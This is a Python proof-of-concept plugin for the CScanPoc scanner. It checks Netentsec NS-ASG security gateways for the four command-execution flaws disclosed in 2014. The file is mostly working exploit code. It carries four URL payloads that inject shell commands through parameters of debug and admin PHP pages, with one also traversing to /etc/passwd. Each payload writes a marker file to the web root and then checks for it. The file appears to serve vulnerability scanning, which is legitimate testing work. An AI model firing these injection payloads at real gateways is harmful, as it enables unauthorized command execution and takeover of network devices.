# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urlparse


class Vuln(ABVuln):
    vuln_id = 'Netentsec_0001'  # 平台漏洞编号，留空
    name = '网康NS-ASG 应用安全网关多处命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-04-30'  # 漏洞公布时间
    desc = '''
        网康 NS-ASG 应用安全网关所有版本任意命令执行可getshell。
        第一处：
        /debug/list_logfile.php?action=restartservice&bash=;echo test >/Isc/third-party/httpd/htdocs/test.txt;
        第二处:
        debug/list_logfile.php?logfile%5B%5D=%2FIsc%2FLog%2Fsshd.log;echo test >/Isc/third-party/httpd/htdocs/t.txt;&action=delete
        第三处
        debug/rproxy_diag.php?action=tarfile&search=&logfile[0]=../../etc/passwd|echo testvul2>../test.txt
        第四处
        admin/device_status.php?action=getethinfo&ethx=a| echo testvul3 > /Isc/third-party/httpd/htdocs/test.txt
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '网康应用安全网关'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'aadf6701-9f86-4097-bb9b-2e3e912db9b9'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2014-058925
            # refer: http://www.wooyun.org/bugs/wooyun-2014-058932
            # refer: http://www.wooyun.org/bugs/wooyun-2014-058944
            hh = hackhttp.hackhttp()
            arg = self.target
            payloads = [
                arg + '/debug/list_logfile.php?action=restartservice&bash=;echo%20testvul0>/Isc/third-party/httpd/htdocs/test.txt;',
                arg + '/debug/list_logfile.php?logfile%5B%5D=%2FIsc%2FLog%2Fsshd.log;echo%20testvul1>/Isc/third-party/httpd/htdocs/test.txt;&action=delete',
                arg +
                '/debug/rproxy_diag.php?action=tarfile&search=&logfile[0]=../../etc/passwd|echo%20testvul2>../test.txt',
                arg + '/admin/device_status.php?action=getethinfo&ethx=a|%20echo%20testvul3%20>%20/Isc/third-party/httpd/htdocs/test.txt'
            ]
            for i in range(len(payloads)):
                payload = payloads[i]
                code, head, res, err, _ = hh.http(payload)
                if code != 0:
                    verify = arg + '/test.txt'
                    code, head, res, err, _ = hh.http(verify)
                    #print res
                    if code == 200 and ('testvul'+str(i)) in res:
                        #security_hole('command execution: ' + payload)
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
